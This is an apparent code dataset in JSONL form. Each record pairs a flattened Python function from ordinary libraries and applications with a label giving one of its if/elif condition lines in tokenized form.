{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 8: self.add_delete_status(d.getVarInt32()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 0 :"}
{"input": "def _init_weight(self): for m in self.modules(): if isinstance(m, nn.Conv2d): n = m.kernel_size[0] * m.kernel_size[1] * m.out_channels m.weight.data.normal_(0, math.sqrt(2.0 / n)) elif isinstance(m, SyncBatchNorm): m.weight.data.fill_(1) m.bias.data.zero_() elif isinstance(m, nn.BatchNorm2d): m.weight.data.fill_(1) m.bias.data.zero_()", "label": "if isinstance ( m , nn . Conv2d ) :"}
{"input": "def wrapper(*args, **kwargs): global _exception try: fn(*args, **kwargs) except Exception: _exception = sys.exc_info() et, ev, tb = _exception if getattr(ev, \"filename\", None) is None: # get the filename from the last item in the stack filename = traceback.extract_tb(tb)[-1][0] else: filename = ev.filename if filename not in _error_files: _error_files.append(filename) raise", "label": "if filename not in _error_files :"}
{"input": "def purge_messages(self): with self.app.connection_for_write() as connection: count = self.app.control.purge(connection=connection) if count: # pragma: no cover print( \"purge: Erased {0} {1} from the queue.\\n\".format( count, pluralize(count, \"message\") ) )", "label": "if count :"}
{"input": "def read_series(rec): found = [] for tag in (\"440\", \"490\", \"830\"): fields = rec.get_fields(tag) if not fields: continue for f in fields: this = [] for k, v in f.get_subfields([\"a\", \"v\"]): if k == \"v\" and v: this.append(v) continue v = v.rstrip(\".,; \") if v: this.append(v) if this: found += [\" -- \".join(this)] return found", "label": "if this :"}
{"input": "def calc_position_values(positions): values = [] for position in positions: if isinstance(position.asset, Future): # Futures don't have an inherent position value. values.append(0.0) else: values.append(position.last_sale_price * position.amount) return values", "label": "if isinstance ( position . asset , Future ) :"}
{"input": "def _loc(obj): try: fn = getattr(obj, \"__file__\", None) if fn is not None: return \" @%s\" % (fn,) obj = getattr(obj, \"im_func\", obj) code = getattr(obj, \"__code__\", None) if code is not None: return \" @%s:%s\" % (code.co_filename, code.co_firstlineno) except Exception: pass return \"\"", "label": "if code is not None :"}
{"input": "def _convert_user_into_remote(self, username, exclude=[\"all\"]): # builds a ref with an username and a branch # this method parses the repository's remotes to find the url matching username # and containing the given branch and returns the corresponding ref remotes = {remote.name: list(remote.urls) for remote in self.repository.remotes} for name in (self.name, \"upstream\") + tuple(remotes.keys()): if name in remotes and name not in exclude: for url in remotes[name]: if self.fqdn in url and username == url.split(\"/\")[-2].split(\":\")[-1]: yield name", "label": "if self . fqdn in url and username == url . split ( \"/\" ) [ - 2 ] . split ( \":\" ) [ - 1 ] :"}
{"input": "def _render_ib_interfaces(cls, network_state, iface_contents, flavor): ib_filter = renderer.filter_by_type(\"infiniband\") for iface in network_state.iter_interfaces(ib_filter): iface_name = iface[\"name\"] iface_cfg = iface_contents[iface_name] iface_cfg.kind = \"infiniband\" iface_subnets = iface.get(\"subnets\", []) route_cfg = iface_cfg.routes cls._render_subnets( iface_cfg, iface_subnets, network_state.has_default_route, flavor ) cls._render_subnet_routes(iface_cfg, route_cfg, iface_subnets, flavor)", "label": "iface_name = iface [ \"name\" ]"}
{"input": "def _extract_level(self): \"\"\"Extract level and component if available (lazy).\"\"\" if self._level is None: split_tokens = self.split_tokens if not split_tokens: self._level = False self._component = False return x = ( self.log_levels.index(split_tokens[1]) if split_tokens[1] in self.log_levels else None ) if x is not None: self._level = split_tokens[1] self._component = split_tokens[2] else: self._level = False self._component = False", "label": "if x is not None :"}
{"input": "def addnode(self, parent, data): print(\"aaa\", data) for i in data: print(i) if i == \"-\": continue if isinstance(i, tuple): item = self.tre_plugins.AppendItem(parent, i[0].title) self.tre_plugins.SetItemData(item, i[0]) self.addnode(item, i[1]) else: item = self.tre_plugins.AppendItem(parent, i[0].title) self.tre_plugins.SetItemData(item, i[0])", "label": "if i == \"-\" :"}
{"input": "def getdsturl(tcpdata): import logging log = logging.getLogger(\"getdsturl\") p = parseHeader(tcpdata, type=\"request\") if p is None: log.warn(\"parseHeader returned None\") return if p.has_key(\"uri\") and p.has_key(\"headers\"): if p[\"headers\"].has_key(\"host\"): r = \"http://%s%s\" % (p[\"headers\"][\"host\"][0], p[\"uri\"]) return r else: log.warn(\"seems like no host header was set\") else: log.warn(\"parseHeader did not give us a nice return %s\" % p)", "label": "if p [ \"headers\" ] . has_key ( \"host\" ) :"}
{"input": "def assert_not_none(obj, msg=None, values=True): \"\"\"Fail the test if given object is None.\"\"\" _msg = \"is None\" if obj is None: if msg is None: msg = _msg elif values is True: msg = \"%s: %s\" % (msg, _msg) _report_failure(msg)", "label": "elif values is True :"}
{"input": "def sort(self): sorted_models = [] concrete_models = set() models = list(self.data) while len(sorted_models) < len(models): found = False for model in models: if model in sorted_models: continue dependencies = self.dependencies.get(model._meta.concrete_model) if not (dependencies and dependencies.difference(concrete_models)): sorted_models.append(model) concrete_models.add(model._meta.concrete_model) found = True if not found: return self.data = OrderedDict((model, self.data[model]) for model in sorted_models)", "label": "if not ( dependencies and dependencies . difference ( concrete_models ) ) :"}
{"input": "def load_vocab_dict(vocab_file_path): \"\"\"Load vocabs, vocab: {\"word\": 1, ...}\"\"\" logging.info(\"Loading vocab from {}\".format(vocab_file_path)) with open(vocab_file_path, encoding=\"utf-8\") as in_f: vocabs = {} for line in in_f: parts = line.rstrip().split(\"\\t\") if len(parts) < 2: continue vocabs[parts[0]] = parts[1] logging.info(\"Loded {} vocabs from {}\".format(len(vocabs), vocab_file_path)) return vocabs", "label": "if len ( parts ) < 2 :"}
{"input": "def get_layers_from_suite(self, suite, suiteClass): top_layer = suiteClass() layers_dict = OrderedDict() for test in self.flatten_suite(suite): layer = getattr(test, \"layer\", None) if layer: if layer not in layers_dict: layers_dict[layer] = LayerSuite(self.session, layer=layer) layers_dict[layer].addTest(test) else: top_layer.addTest(test) self.get_parent_layers(layers_dict) return top_layer, layers_dict", "label": "if layer :"}
{"input": "def team_scores(self, team_scores, time): \"\"\"Store output of team scores to a JSON file\"\"\" data = [] for score in team_scores[\"fixtures\"]: if score[\"status\"] == \"FINISHED\": item = { \"date\": score[\"date\"].split(\"T\")[0], \"homeTeamName\": score[\"homeTeamName\"], \"goalsHomeTeam\": score[\"result\"][\"goalsHomeTeam\"], \"goalsAwayTeam\": score[\"result\"][\"goalsAwayTeam\"], \"awayTeamName\": score[\"awayTeamName\"], } data.append(item) self.generate_output({\"team_scores\": data})", "label": "if score [ \"status\" ] == \"FINISHED\" :"}
{"input": "def run(self, root): footnotesDiv = self.footnotes.makeFootnotesDiv(root) if footnotesDiv is not None: result = self.footnotes.findFootnotesPlaceholder(root) if result: child, parent, isText = result ind = list(parent).index(child) if isText: parent.remove(child) parent.insert(ind, footnotesDiv) else: parent.insert(ind + 1, footnotesDiv) child.tail = None else: root.append(footnotesDiv)", "label": "if isText :"}
{"input": "def delete_target_group(self, target_group_arn): if target_group_arn not in self.target_groups: raise TargetGroupNotFoundError() target_group = self.target_groups[target_group_arn] if target_group: if self._any_listener_using(target_group_arn): raise ResourceInUseError( \"The target group '{}' is currently in use by a listener or a rule\".format( target_group_arn ) ) del self.target_groups[target_group_arn] return target_group", "label": "if self . _any_listener_using ( target_group_arn ) :"}
{"input": "def run_pending(self, now=None): \"\"\"Runs the command if scheduled\"\"\" now = now or datetime.now() if self.is_enabled(): if self.last_run is None: self.last_run = now next_time = self.schedule(self.last_run).get_next() if next_time < now: self.last_run = now return self.run() return -1", "label": "if self . last_run is None :"}
{"input": "def _fix_exception_context(new_exc, old_exc): # Context may not be correct, so find the end of the chain while 1: exc_context = new_exc.__context__ if exc_context is old_exc: # Context is already set correctly (see issue 20317) return if exc_context is None or exc_context is frame_exc: break new_exc = exc_context # Change the end of the chain to point to the exception # we expect it to reference new_exc.__context__ = old_exc", "label": "if exc_context is old_exc :"}
{"input": "def delete_backend( self, backend_tag: BackendTag, force_kill: bool = False ) -> Optional[GoalId]: async with self.write_lock: # Check that the specified backend isn't used by any endpoints. for endpoint, info in self.endpoint_state.get_endpoints().items(): if backend_tag in info[\"traffic\"] or backend_tag in info[\"shadows\"]: raise ValueError( \"Backend '{}' is used by endpoint '{}' \" \"and cannot be deleted. Please remove \" \"the backend from all endpoints and try \" \"again.\".format(backend_tag, endpoint) ) return self.backend_state.delete_backend(backend_tag, force_kill)", "label": "if backend_tag in info [ \"traffic\" ] or backend_tag in info [ \"shadows\" ] :"}
{"input": "def lint(self, request): try: html_linter = UnwrapObject(self._koLintService.getLinterForLanguage(\"HTML\")) return html_linter.lint(request, TPLInfo=self._tplPatterns) except: if \"lint\" not in self._checkValidVersion_complained: self._checkValidVersion_complained[\"lint\"] = True log.exception(\"Problem in koPHPLinter.lint\") return koLintResults()", "label": "if \"lint\" not in self . _checkValidVersion_complained :"}
{"input": "def get_commit(self, rev): \"\"\"Get commit object identified by `rev` (SHA or branch or tag name).\"\"\" for prefix in [\"refs/heads/\", \"refs/tags/\", \"\"]: key = prefix + rev try: obj = self[encode_for_git(key)] if isinstance(obj, dulwich.objects.Tag): obj = self[obj.object[1]] return obj except KeyError: pass raise KeyError(rev)", "label": "if isinstance ( obj , dulwich . objects . Tag ) :"}
{"input": "def get_host_metadata(self): meta = {} if self.agent_url: try: resp = requests.get(self.agent_url, timeout=1).json().get(\"config\", {}) if \"Version\" in resp: meta[\"nomad_version\"] = resp.get(\"Version\") if \"Region\" in resp: meta[\"nomad_region\"] = resp.get(\"Region\") if \"Datacenter\" in resp: meta[\"nomad_datacenter\"] = resp.get(\"Datacenter\") except Exception as ex: self.log.debug(\"Error getting Nomad version: %s\" % str(ex)) return meta", "label": "if \"Version\" in resp :"}
{"input": "def _waitFakenetStopped(self, timeoutsec=None): retval = False while True: if self._confirmFakenetStopped(): retval = True break time.sleep(1) if timeoutsec is not None: timeoutsec -= 1 if timeoutsec <= 0: break return retval", "label": "if self . _confirmFakenetStopped ( ) :"}
{"input": "def send_message(self, message): smtp = smtplib.SMTP(self.smtp_host, self.smtp_port) try: smtp.ehlo() if self.smtp_tls: smtp.starttls() if self.smtp_user: smtp.login(self.smtp_user, self.smtp_password) smtp.sendmail(self.from_user, self.recipients, message.as_string()) finally: smtp.close()", "label": "if self . smtp_user :"}
{"input": "def set_tracker_icon(tracker_icon, cell): if tracker_icon: pixbuf = tracker_icon.get_cached_icon() if pixbuf is None: pixbuf = get_pixbuf_at_size(tracker_icon.get_filename(), 16) tracker_icon.set_cached_icon(pixbuf) else: pixbuf = create_blank_pixbuf() # Suppress Warning: g_object_set_qdata: assertion `G_IS_OBJECT (object)' failed with warnings.catch_warnings(): warnings.simplefilter(\"ignore\") cell.set_property(\"pixbuf\", pixbuf)", "label": "if pixbuf is None :"}
{"input": "def __create_index(self, collection, index, unique): doc = collection.find_one(projection={\"_id\": 1}) if doc is None: try: indexes = list(collection.list_indexes()) except OperationFailure: indexes = [] if index not in indexes: collection.create_index(index, unique=unique)", "label": "if index not in indexes :"}
{"input": "def read_oclc(fields): if \"035\" not in fields: return {} found = [] for line in fields[\"035\"]: for v in get_subfield_values(line, [\"a\"]): m = re_oclc.match(v) if not m: continue oclc = m.group(1) if oclc not in found: found.append(oclc) return {\"oclc_number\": found} if found else {}", "label": "if not m :"}
{"input": "def closest_enemy_ant(self, row1, col1, filter=None): # find the closest enemy ant from this row/col min_dist = maxint closest_ant = None for ant in self.enemy_ants(): if filter is None or ant not in filter: dist = self.distance(row1, col1, ant[0][0], ant[0][1]) if dist < min_dist: min_dist = dist closest_ant = ant[0] return closest_ant", "label": "if filter is None or ant not in filter :"}
{"input": "def fromVariant(variant): if hasattr(QtCore, \"QVariant\") and isinstance(variant, QtCore.QVariant): t = variant.type() if t == QtCore.QVariant.String: return str(variant.toString()) elif t == QtCore.QVariant.Double: return variant.toDouble()[0] elif t == QtCore.QVariant.Int: return variant.toInt()[0] elif t == QtCore.QVariant.Bool: return variant.toBool() elif t == QtCore.QVariant.Invalid: return None else: raise ValueError('Unsupported QVariant type \"%s\"' % variant.typeName()) else: return variant", "label": "elif t == QtCore . QVariant . Double :"}
{"input": "def _check_old_with_state(self): add_vec = False for op in self.ops: if op.type == \"func\": try: op.get_coeff(0.0, self.args) except TypeError as e: nfunc = _StateAsArgs(self.coeff) op = EvoElement((op.qobj, nfunc, nfunc, \"func\")) add_vec = True if add_vec: self.dynamics_args += [(\"_state_vec\", \"vec\", None)]", "label": "if op . type == \"func\" :"}
{"input": "def _read_readable(self, readable): blocksize = 8192 if self.debuglevel > 0: print(\"sendIng a read()able\") encode = self._is_textIO(readable) if encode and self.debuglevel > 0: print(\"encoding file using iso-8859-1\") while True: datablock = readable.read(blocksize) if not datablock: break if encode: datablock = datablock.encode(\"iso-8859-1\") yield datablock", "label": "if not datablock :"}
{"input": "def read_chat_forever(reader, pub_socket): line = reader.readline() who = \"someone\" while line: print(\"Chat:\", line.strip()) if line.startswith(\"name:\"): who = line.split(\":\")[-1].strip() try: pub_socket.send_pyobj((who, line)) except socket.error as e: # ignore broken pipes, they just mean the participant # closed its connection already if e[0] != 32: raise line = reader.readline() print(\"Participant left chat.\")", "label": "if e [ 0 ] != 32 :"}
{"input": "def _wrapped() -> None: should_run = app.is_leader() if on_leader else True if should_run: with self.trace(shortlabel(fun), trace_enabled=traced): # pass app only if decorated function takes an argument if inspect.signature(fun).parameters: task_takes_app = cast(Callable[[AppT], Awaitable], fun) return await task_takes_app(app) else: task = cast(Callable[[], Awaitable], fun) return await task()", "label": "if inspect . signature ( fun ) . parameters :"}
{"input": "def Decode(self, filedesc): while True: chunk = filedesc.Read(4) if not chunk: return if chunk == b\"QUUX\": yield b\"NORF\" if chunk == b\"THUD\": yield b\"BLARGH\"", "label": "if chunk == b\"THUD\" :"}
{"input": "def _get_modules(fn): finder = modulefinder.ModuleFinder() finder.run_script(fn) all = [] for m in finder.modules.values(): if not isinstance(m, modulefinder.Module): continue if not m.__file__: continue # skip shared object files if m.__file__.endswith(\".so\"): continue # skip mac system stuff... # FIXME: would need to augment with other OS's system stuff if m.__file__.startswith(\"/Library/Frameworks\"): continue all.append(m) return all", "label": "if not m . __file__ :"}
{"input": "def _read(self, size): \"\"\"Return size bytes from the stream.\"\"\" if self.comptype == \"tar\": return self.__read(size) c = len(self.dbuf) while c < size: buf = self.__read(self.bufsize) if not buf: break try: buf = self.cmp.decompress(buf) except IOError: raise ReadError(\"invalid compressed data\") self.dbuf += buf c += len(buf) buf = self.dbuf[:size] self.dbuf = self.dbuf[size:] return buf", "label": "if not buf :"}
{"input": "def cluster_list(tokeniser): clusterids = [] value = tokeniser() try: if value == \"[\": while True: value = tokeniser() if value == \"]\": break clusterids.append(ClusterID(value)) else: clusterids.append(ClusterID(value)) if not clusterids: raise ValueError(\"no cluster-id in the cluster list\") return ClusterList(clusterids) except ValueError: raise ValueError(\"invalud cluster list\")", "label": "if value == \"]\" :"}
{"input": "def from_data(cls, value, currency, includes_tax=None): if includes_tax is None: if cls.includes_tax is None: msg = \"Missing includes_tax argument for %s.from_data\" raise TypeError(msg % (cls.__name__,)) includes_tax = cls.includes_tax if includes_tax: return TaxfulPrice(value, currency) else: return TaxlessPrice(value, currency)", "label": "if cls . includes_tax is None :"}
{"input": "def THUMB(image, nx=120, ny=120, gae=False, name=\"thumb\"): if image: if not gae: request = current.request from PIL import Image import os img = Image.open(os.path.join(request.folder, \"uploads\", image)) img.thumbnail((nx, ny), Image.ANTIALIAS) root, ext = os.path.splitext(image) thumb = \"%s_%s%s\" % (root, name, ext) img.save(request.folder + \"uploads/\" + thumb) return thumb else: return image", "label": "if not gae :"}
{"input": "def _get_two_devices(self, require_same_type=False): tpus = extensions.tpu_devices() if FLAGS.requires_tpu: if len(tpus) == 2: res = tpus else: raise ValueError( \"This test requires 2 TPU cores but %s are found\" % len(tpus) ) else: if len(tpus) == 2: res = tpus elif self._hasGPU() and not require_same_type: res = (\"CPU:0\", \"GPU:0\") else: res = (\"CPU:0\", \"CPU:1\") return res", "label": "elif self . _hasGPU ( ) and not require_same_type :"}
{"input": "def _format_repos(self, value): result = {} if value: for path, config in iteritems(value): if path[0] != \"/\": # assume its a module path = os.path.abspath(__import__(path).__file__) result[path] = config return result", "label": "if path [ 0 ] != \"/\" :"}
{"input": "def skipIndent(self, s, i, width): ws = 0 n = len(s) while i < n and ws < width: if s[i] == \"\\t\": ws += abs(self.tab_width) - (ws % abs(self.tab_width)) elif s[i] == \" \": ws += 1 else: break i += 1 return i", "label": "if s [ i ] == \"\\t\" :"}
{"input": "def get_assets_historical_range_close_price( self, start_dt, end_dt, asset_symbols, adjusted=False ): \"\"\" \"\"\" prices_df = None for ds in self.data_sources: try: prices_df = ds.get_assets_historical_closes( start_dt, end_dt, asset_symbols, adjusted=adjusted ) if prices_df is not None: return prices_df except Exception: raise return prices_df", "label": "if prices_df is not None :"}
{"input": "def matchBrackets(string): rest = string[1:] inside = \"(\" while rest != \"\" and not rest.startswith(\")\"): if rest.startswith(\"(\"): (part, rest) = matchBrackets(rest) inside = inside + part else: inside = inside + rest[0] rest = rest[1:] if rest.startswith(\")\"): return (inside + \")\", rest[1:]) raise AssertionError(\"Unmatched bracket in string '\" + string + \"'\")", "label": "if rest . startswith ( \"(\" ) :"}
{"input": "def is_different(item, seen): is_diff = True if item not in seen: for value in other: if comparator(iteratee(item), iteratee(value)): is_diff = False break if is_diff: seen.append(item) return is_diff", "label": "if comparator ( iteratee ( item ) , iteratee ( value ) ) :"}
{"input": "def write_conditional_formatting(worksheet): \"\"\"Write conditional formatting to xml.\"\"\" wb = worksheet.parent for range_string, rules in iteritems(worksheet.conditional_formatting.cf_rules): cf = Element(\"conditionalFormatting\", {\"sqref\": range_string}) for rule in rules: if rule.dxf is not None: if rule.dxf != DifferentialStyle(): rule.dxfId = len(wb._differential_styles) wb._differential_styles.append(rule.dxf) cf.append(rule.to_tree()) yield cf", "label": "if rule . dxf != DifferentialStyle ( ) :"}
{"input": "def checkForFinishedThreads(self): \"Mark terminated threads with endTime.\" for t in self.unfinishedThreads: if not t.is_alive(): t.endTime = time.process_time() if getattr(t, \"status\", None) is None: t.status = \"ended\"", "label": "if not t . is_alive ( ) :"}
{"input": "def _process_dispatch_entries(self, dispatch_info_external): path_only_entries = [] hostname_entries = [] for entry in dispatch_info_external.dispatch: parsed_url = dispatchinfo.ParsedURL(entry.url) if parsed_url.host: hostname_entries.append(entry) else: path_only_entries.append((parsed_url, entry.server)) if hostname_entries: logging.warning( \"Hostname routing is not supported by the development server. The \" \"following dispatch entries will not match any requests:\\n%s\", \"\\n\\t\".join(str(entry) for entry in hostname_entries), ) self._entries = path_only_entries", "label": "if parsed_url . host :"}
{"input": "def iter_ReassignParameters(self, inputNode, variables, nodeByID): for node in inputNode.getReassignParameterNodes(nodeByID): yield from iterNodeCommentLines(node) yield from iterInputConversionLines(node, variables) socket = node.inputs[0] if socket.isUnlinked and socket.isCopyable(): expression = getCopyExpression(socket, variables) else: expression = variables[socket] if node.conditionSocket is None: conditionPrefix = \"\" else: conditionPrefix = \"if {}: \".format(variables[node.conditionSocket]) yield \"{}{} = {}\".format( conditionPrefix, variables[node.linkedParameterSocket], expression )", "label": "if socket . isUnlinked and socket . isCopyable ( ) :"}
{"input": "def _feed_data(self, data_pair: types.Sequence, type_: str) -> types.Sequence: result = [] type_list = [ChartType.LINES, ChartType.CUSTOM] if type_ in type_list: result = data_pair else: for n, v in data_pair: try: lng, lat = self.get_coordinate(n) result.append({\"name\": n, \"value\": [lng, lat, v]}) except TypeError as err: if self._is_ignore_nonexistent_coord is not True: raise NonexistentCoordinatesException(err, (n, v)) return result", "label": "if self . _is_ignore_nonexistent_coord is not True :"}
{"input": "def _parse_whois(self, txt): asn, desc = None, b\"\" for l in txt.splitlines(): if not asn and l.startswith(b\"origin:\"): asn = l[7:].strip().decode(\"utf-8\") if l.startswith(b\"descr:\"): if desc: desc += br\"\\n\" desc += l[6:].strip() if asn is not None and desc.strip(): desc = desc.strip().decode(\"utf-8\") break return asn, desc", "label": "if asn is not None and desc . strip ( ) :"}
{"input": "def _resolve_result(self, f=None): try: if f: results = f.result() else: results = list(map(self._client.results.get, self.msg_ids)) if self._single_result: r = results[0] if isinstance(r, Exception): raise r else: results = error.collect_exceptions(results, self._fname) self._success = True self.set_result(self._reconstruct_result(results)) except Exception as e: self._success = False self.set_exception(e)", "label": "if f :"}
{"input": "def new_org(type=ORG_DEFAULT, block=True, **kwargs): if type == ORG_DEFAULT: org = reserve_pooled(type=type, **kwargs) if not org: org = queue.reserve(\"queued_org\", block=block, type=type, **kwargs) if org: new_pooled() return org org = Organization(type=type, **kwargs) org.initialize() org.commit() return org else: org = Organization(type=type, **kwargs) org.queue_initialize(block=block) return org", "label": "if not org :"}
{"input": "def _compileRules(rulesList, maxLength=4): ruleChecking = collections.defaultdict(list) for ruleIndex in range(len(rulesList)): args = [] if len(rulesList[ruleIndex]) == maxLength: args = rulesList[ruleIndex][-1] if maxLength == 4: (shouldRunMethod, method, isCorrect) = rulesList[ruleIndex][0:3] ruleChecking[shouldRunMethod].append((method, isCorrect, args)) elif maxLength == 3: (shouldRunMethod, method) = rulesList[ruleIndex][0:2] ruleChecking[shouldRunMethod].append((method, args)) return ruleChecking", "label": "if len ( rulesList [ ruleIndex ] ) == maxLength :"}
{"input": "def setHighlightedItem(self, item): if item != None: for listItem in self.children.getItems(): if self.loadHandler.matchesItem(listItem, item): self.children.setCurrentItem(listItem) return else: self.children.setCurrentItem(None)", "label": "if self . loadHandler . matchesItem ( listItem , item ) :"}
{"input": "def getForts(location): global forts lforts = [] for i in forts: f = (i[\"latitude\"], i[\"longitude\"]) d = vincenty(location, f).meters if d < 900: lforts.append(i) return lforts", "label": "if d < 900 :"}
{"input": "def page_file(self, page): if page.isroot: raise PathLookupError(\"Can not export: %s\", page) elif self.namespace: if page.ischild(self.namespace): name = page.relname(self.namespace) else: # This layout can not store page == namespace ! raise PathLookupError(\"%s not a child of %s\" % (page, self.namespace)) else: name = page.name return self.dir.file(encode_filename(name) + \".\" + self.ext)", "label": "if page . ischild ( self . namespace ) :"}
{"input": "def to_json_dict(self): d = super().to_json_dict() if self.header is not None: if isinstance(self.header, RenderedContent): d[\"header\"] = self.header.to_json_dict() else: d[\"header\"] = self.header if self.subheader is not None: if isinstance(self.subheader, RenderedContent): d[\"subheader\"] = self.subheader.to_json_dict() else: d[\"subheader\"] = self.subheader d[\"text\"] = RenderedContent.rendered_content_list_to_json(self.text) return d", "label": "if isinstance ( self . subheader , RenderedContent ) :"}
{"input": "def fixfunnychars(addr): i = 0 while i < len(addr): c = addr[i] if c not in goodchars: c = \"-\" addr = addr[:i] + c + addr[i + 1 :] i = i + len(c) return addr", "label": "if c not in goodchars :"}
{"input": "def refactor_stdin(self, doctests_only=False): input = sys.stdin.read() if doctests_only: self.log_debug(\"Refactoring doctests in stdin\") output = self.refactor_docstring(input, \"<stdin>\") if self.write_unchanged_files or output != input: self.processed_file(output, \"<stdin>\", input) else: self.log_debug(\"No doctest changes in stdin\") else: tree = self.refactor_string(input, \"<stdin>\") if self.write_unchanged_files or (tree and tree.was_changed): self.processed_file(str(tree), \"<stdin>\", input) else: self.log_debug(\"No changes in stdin\")", "label": "if self . write_unchanged_files or output != input :"}
{"input": "def test_compute_gradient(self): for y, y_pred in zip(self.y_list, self.predict_list): lse_grad = self.lae_loss.compute_grad(y, y_pred) diff = y_pred - y if diff > consts.FLOAT_ZERO: grad = 1 elif diff < consts.FLOAT_ZERO: grad = -1 else: grad = 0 self.assertTrue(np.fabs(lse_grad - grad) < consts.FLOAT_ZERO)", "label": "if diff > consts . FLOAT_ZERO :"}
{"input": "def restart(self): try: # remove old pidfile first try: if self.runAsDaemon(): try: self.daemon.stop() except: pass except: self.log.critical(traceback.format_exc()) # Release log files and shutdown logger logging.shutdown() args = ( [sys.executable] + [os.path.join(base_path, os.path.basename(__file__))] + sys.argv[1:] ) subprocess.Popen(args) except: self.log.critical(traceback.format_exc())", "label": "if self . runAsDaemon ( ) :"}
{"input": "def classifyws(s, tabwidth): raw = effective = 0 for ch in s: if ch == \" \": raw = raw + 1 effective = effective + 1 elif ch == \"\\t\": raw = raw + 1 effective = (effective // tabwidth + 1) * tabwidth else: break return raw, effective", "label": "if ch == \" \" :"}
{"input": "def code_match(code, select, ignore): if ignore: assert not isinstance(ignore, unicode) for ignored_code in [c.strip() for c in ignore]: if mutual_startswith(code.lower(), ignored_code.lower()): return False if select: assert not isinstance(select, unicode) for selected_code in [c.strip() for c in select]: if mutual_startswith(code.lower(), selected_code.lower()): return True return False return True", "label": "if mutual_startswith ( code . lower ( ) , selected_code . lower ( ) ) :"}
{"input": "def get_tokens_unprocessed(self, text): from pygments.lexers._asy_builtins import ASYFUNCNAME, ASYVARNAME for index, token, value in RegexLexer.get_tokens_unprocessed(self, text): if token is Name and value in ASYFUNCNAME: token = Name.Function elif token is Name and value in ASYVARNAME: token = Name.Variable yield index, token, value", "label": "if token is Name and value in ASYFUNCNAME :"}
{"input": "def makeDataURI(data=None, mimetype=None, filename=None): import base64 if not mimetype: if filename: import mimetypes mimetype = mimetypes.guess_type(filename)[0].split(\";\")[0] else: raise Exception( \"You need to provide a mimetype or a filename for makeDataURI\" ) return \"data:\" + mimetype + \";base64,\" + \"\".join(base64.encodestring(data).split())", "label": "if filename :"}
{"input": "def add_attributes(attributes, all_base64): lines = [] oc_attr = None # objectclass first, even if this is not specified in the RFC for attr in attributes: if attr.lower() == \"objectclass\": for val in attributes[attr]: lines.append(_convert_to_ldif(attr, val, all_base64)) oc_attr = attr break # remaining attributes for attr in attributes: if attr != oc_attr and attr in attributes: for val in attributes[attr]: lines.append(_convert_to_ldif(attr, val, all_base64)) return lines", "label": "if attr . lower ( ) == \"objectclass\" :"}
{"input": "def read_optional_seed(fill, base=\"\", ext=\"\", timeout=5): try: (md, ud, vd) = read_seeded(base, ext, timeout) fill[\"user-data\"] = ud fill[\"vendor-data\"] = vd fill[\"meta-data\"] = md return True except url_helper.UrlError as e: if e.code == url_helper.NOT_FOUND: return False raise", "label": "if e . code == url_helper . NOT_FOUND :"}
{"input": "def _get_spawn_property(self, constraints, constraint_name, services): if services: # this isn't very nice if constraint_name == IMAGE_CONSTRAINT: return services[0].image elif constraint_name == CPUS_CONSTRAINT: return services[0].cpus for constraint in constraints: if constraint.name == constraint_name: return constraint.value return None", "label": "elif constraint_name == CPUS_CONSTRAINT :"}
{"input": "def delete_api(self): retries = 0 while retries < 10: try: self.client.delete_rest_api(restApiId=self.api_id) break except exceptions.ClientError as e: if e.response[\"Error\"][\"Code\"] == \"TooManyRequestsException\": retries += 1 time.sleep(5) else: raise", "label": "if e . response [ \"Error\" ] [ \"Code\" ] == \"TooManyRequestsException\" :"}
{"input": "def GetSelected(self): if self.GetStyleL(\"style\") & self.Style.LBS_MULTIPLESEL: result = self.SendMessage(self.Hwnd, self.Msg.LB_GETSELCOUNT, 0, 0) if result: return self.SendMessage(self.Hwnd, self.Msg.LB_GETANCHORINDEX, 0, 0) else: result = self.SendMessage(self.Hwnd, self.Msg.LB_GETCURSEL, 0, 0) if result != LB_ERR: return result", "label": "if result :"}
{"input": "def compare_objects(left, right): left_fields = left.map_value.fields right_fields = right.map_value.fields for left_key, right_key in zip(sorted(left_fields), sorted(right_fields)): keyCompare = Order._compare_to(left_key, right_key) if keyCompare != 0: return keyCompare value_compare = Order.compare(left_fields[left_key], right_fields[right_key]) if value_compare != 0: return value_compare return Order._compare_to(len(left_fields), len(right_fields))", "label": "if value_compare != 0 :"}
{"input": "def get_opnd_types_short(ii): types = [] for op in _gen_opnds(ii): if op.oc2: types.append(op.oc2) elif op_luf_start(op, \"GPRv\"): types.append(\"v\") elif op_luf_start(op, \"GPRz\"): types.append(\"z\") elif op_luf_start(op, \"GPRy\"): types.append(\"y\") else: die(\"Unhandled op type {}\".format(op)) return types", "label": "elif op_luf_start ( op , \"GPRv\" ) :"}
{"input": "def _iter_indented_subactions(self, action): try: get_subactions = action._get_subactions except AttributeError: pass else: self._indent() if isinstance(action, argparse._SubParsersAction): for subaction in sorted(get_subactions(), key=lambda x: x.dest): yield subaction else: for subaction in get_subactions(): yield subaction self._dedent()", "label": "if isinstance ( action , argparse . _SubParsersAction ) :"}
{"input": "def has_safe_repr(value): \"\"\"Does the node have a safe representation?\"\"\" if value is None or value is NotImplemented or value is Ellipsis: return True if type(value) in (bool, int, float, complex, range_type, Markup) + string_types: return True if type(value) in (tuple, list, set, frozenset): for item in value: if not has_safe_repr(item): return False return True elif type(value) is dict: for key, value in iteritems(value): if not has_safe_repr(key): return False if not has_safe_repr(value): return False return True return False", "label": "if not has_safe_repr ( item ) :"}
{"input": "def _compute_missing_fields_error(context, field_defs, incoming_fields): missing_fields = [] for field_name, field_def in field_defs.items(): if not field_def.is_optional and field_name not in incoming_fields: missing_fields.append(field_name) if missing_fields: if len(missing_fields) == 1: return create_missing_required_field_error(context, missing_fields[0]) else: return create_missing_required_fields_error(context, missing_fields)", "label": "if not field_def . is_optional and field_name not in incoming_fields :"}
{"input": "def _list(self): data_sources = self.mkt_contract.functions.getAllProviders().call() data = [] for index, data_source in enumerate(data_sources): if index > 0: if \"test\" not in Web3.toText(data_source).lower(): data.append(dict(dataset=self.to_text(data_source))) return pd.DataFrame(data)", "label": "if index > 0 :"}
{"input": "def close_file_in_all_editorstacks(self, editorstack_id_str, index): for editorstack in self.editorstacks: if str(id(editorstack)) != editorstack_id_str: editorstack.blockSignals(True) editorstack.close_file(index, force=True) editorstack.blockSignals(False)", "label": "if str ( id ( editorstack ) ) != editorstack_id_str :"}
